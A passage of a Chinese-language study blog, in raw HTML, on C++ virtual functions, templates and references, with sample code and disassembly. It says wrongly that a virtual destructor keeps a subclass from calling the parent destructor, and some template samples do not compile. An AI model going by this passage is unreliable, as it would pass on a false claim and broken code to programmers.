FFcall，通过虚表实现</p>\n<p>动态绑定就是多态，相同函数体现出了不同的行为</p>\n<p>多态实现了父类的指针访问子类的方法</p>\n<p>虚析构在继承的时候有用，把父类的析构定义成虚函数，这样子类在析构时不会调用父类的析构</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230301150809049.png\" alt=\"image-20230301150809049\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230301150833000.png\" alt=\"image-20230301150833000\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Base</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t<span class=\"built_in\">Base</span>()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;x = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;y = <span class=\"number\">2</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span> <span class=\"title\">print</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d\\n&quot;</span>,<span class=\"keyword\">this</span>-&gt;x,<span class=\"keyword\">this</span>-&gt;y);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sub1</span>:Base</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> A;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">Sub1</span>()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;x = <span class=\"number\">3</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;y = <span class=\"number\">4</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;A = <span class=\"number\">5</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">print</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,<span class=\"keyword\">this</span>-&gt;x,<span class=\"keyword\">this</span>-&gt;y,<span class=\"keyword\">this</span>-&gt;A);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Sub2</span>:Base</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> B;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">Sub2</span>()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;x = <span class=\"number\">6</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;y = <span class=\"number\">7</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">this</span>-&gt;B = <span class=\"number\">8</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">print</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,<span class=\"keyword\">this</span>-&gt;x,<span class=\"keyword\">this</span>-&gt;y,<span class=\"keyword\">this</span>-&gt;B);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tBase b;</span><br><span class=\"line\">\tSub1 s1;</span><br><span class=\"line\">\tSub2 s2;</span><br><span class=\"line\">\tBase* arr[] = &#123;&amp;b,(Base*)&amp;s1,(Base*)&amp;s2&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tarr[i]-&gt;<span class=\"built_in\">print</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//如果Base的print存在virtual，那么结果为1 2  3 4 5  6 7 8，可以使用父类的指针访问子类的print</span></span><br><span class=\"line\"><span class=\"comment\">//如果没有virtual,那么结果为1 2  3 4  6 7，调用的都是父类的方法</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Animal</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span> <span class=\"title\">sing</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tstd::cout&lt;&lt; <span class=\"string\">&quot;nishishabi&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Dog</span>:<span class=\"keyword\">public</span> Animal</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">sing</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tstd::cout&lt;&lt; <span class=\"string\">&quot;wangwang&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cat</span>:<span class=\"keyword\">public</span> Animal</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">sing</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tstd::cout&lt;&lt; <span class=\"string\">&quot;miaomiao!!!&quot;</span> &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tDog d;</span><br><span class=\"line\"></span><br><span class=\"line\">\tAnimal* a = (Animal*)&amp;d;</span><br><span class=\"line\">\ta-&gt;<span class=\"built_in\">sing</span>();   <span class=\"comment\">//if virtual exists,print wangwang,else print nishishabi</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"模板\"><a class=\"markdownIt-Anchor\" href=\"#模板\">#</a> 模板</h3>\n<p>函数模板</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">sort</span><span class=\"params\">(T arr, <span class=\"type\">int</span> nLength)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> k=<span class=\"number\">0</span>; k&lt;nLength<span class=\"number\">-1</span>; k++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;nLength-k<span class=\"number\">-1</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(arr[i]&gt;arr[i+<span class=\"number\">1</span>])</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                T temp = arr[i];</span><br><span class=\"line\">                arr[i] = arr[i+<span class=\"number\">1</span>];</span><br><span class=\"line\">                arr[i+<span class=\"number\">1</span>] = temp;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>, <span class=\"keyword\">class</span> <span class=\"title class_\">E</span>&gt;</span><br><span class=\"line\"><span class=\"comment\">//T和E是两个不同的类型，T是int* E是int</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Find</span><span class=\"params\">(T arr, <span class=\"type\">int</span> nLength, E nElement)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> nBegin = <span class=\"number\">0</span>, nEnd = nLength - <span class=\"number\">1</span>, nIndex;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (nBegin &lt;= nEnd)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tnIndex = (nBegin + nEnd) / <span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (nElement &gt; arr[nIndex])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tnBegin = nIndex + <span class=\"number\">1</span>;</span><br><span class=\"line\">;\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (nElement &lt; arr[nIndex])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tnEnd = nIndex - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> nIndex;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>类模板</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>, <span class=\"keyword\">class</span> <span class=\"title class_\">M</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyClass</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\">T <span class=\"title\">Max</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\">M <span class=\"title\">Min</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\tT x;</span><br><span class=\"line\">\tT y;</span><br><span class=\"line\">\tM a;</span><br><span class=\"line\">\tM b;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230302153313237.png\" alt=\"image-20230302153313237\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>, <span class=\"keyword\">class</span> <span class=\"title class_\">E</span>&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">swap</span><span class=\"params\">(T x, T y, E sb)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tE temp = *x;</span><br><span class=\"line\">\t*x = *y;</span><br><span class=\"line\">\t*y = temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">double</span> a = <span class=\"number\">4.45</span>, b = <span class=\"number\">8.99</span>, c;</span><br><span class=\"line\"></span><br><span class=\"line\">\tstd::cout &lt;&lt; a &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">swap</span>(&amp;a,&amp;b,c);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstd::cout &lt;&lt; a &lt;&lt; <span class=\"string\">&quot; &quot;</span> &lt;&lt; b &lt;&lt; <span class=\"string\">&#x27;\\n&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;Hello World!\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Base</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>, <span class=\"keyword\">class</span> <span class=\"title class_\">E</span>&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">sort</span><span class=\"params\">(T arr, <span class=\"type\">int</span> nLength, E sb)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> k = <span class=\"number\">0</span>; k &lt; nLength - <span class=\"number\">1</span>; k++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; nLength - k - <span class=\"number\">1</span>; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">            <span class=\"comment\">//class Base&#x27; does not define this operator or a conversion to a type acceptable to the predefined operator</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (*arr[i] &gt; *arr[i + <span class=\"number\">1</span>])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tE temp = *arr[i];</span><br><span class=\"line\">\t\t\t\t*arr[i] = *arr[i + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t\t\t*arr[i + <span class=\"number\">1</span>] = *temp;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBase b1, b2, b3, b4, b5;</span><br><span class=\"line\">\tBase* arr1[<span class=\"number\">5</span>] = &#123; &amp;b1, &amp;b2, &amp;b3, &amp;b4, &amp;b5 &#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">sort</span>(arr1, <span class=\"number\">5</span>, &amp;b1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">5</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,arr1[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;Hello World!\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<h3 id=\"引用类型\"><a class=\"markdownIt-Anchor\" href=\"#引用类型\">#</a> 引用类型</h3>\n<p>指针传递的时候指针可以修改</p>\n<p>能使用指针的就能使用引用</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Test</span><span class=\"params\">(<span class=\"type\">int</span>&amp; x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Test2</span><span class=\"params\">(<span class=\"type\">int</span>* x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t*x = <span class=\"number\">10086</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a = <span class=\"number\">100</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">Test</span>(a);</span><br><span class=\"line\">\tstd::cout&lt;&lt; a &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;  <span class=\"comment\">//1</span></span><br><span class=\"line\">\t<span class=\"built_in\">Test2</span>(&amp;a);</span><br><span class=\"line\">\tstd::cout&lt;&lt; a &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;  <span class=\"comment\">//10086</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">174</span>:      <span class=\"built_in\">Test</span>(a);</span><br><span class=\"line\"><span class=\"number\">0040181F</span> <span class=\"number\">8</span>D <span class=\"number\">45</span> FC             lea         eax,[ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">00401822</span> <span class=\"number\">50</span>                   push        eax</span><br><span class=\"line\"><span class=\"number\">00401823</span> E8 <span class=\"number\">04</span> F9 FF FF       call        @ILT+<span class=\"number\">295</span>(Test) (<span class=\"number\">0040112</span>c)</span><br><span class=\"line\"><span class=\"number\">00401828</span> <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">176</span>:      <span class=\"built_in\">Test2</span>(&amp;a);</span><br><span class=\"line\"><span class=\"number\">00401847</span> <span class=\"number\">8</span>D <span class=\"number\">55</span> FC             lea         edx,[ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040184</span>A <span class=\"number\">52</span>                   push        edx</span><br><span class=\"line\"><span class=\"number\">0040184B</span> E8 E0 F9 FF FF       call        @ILT+<span class=\"number\">555</span>(Test2) (<span class=\"number\">00401230</span>)</span><br><span class=\"line\"><span class=\"number\">00401850</span> <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>引用和指针在汇编是一样的，都是 lea，但编译器不允许引用再指向别的地方</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、引用类型是C++里面的类型</span><br><span class=\"line\">2、引用类型只能赋值一次，不能重新赋值</span><br><span class=\"line\">3、引用只是变量的一个别名.</span><br><span 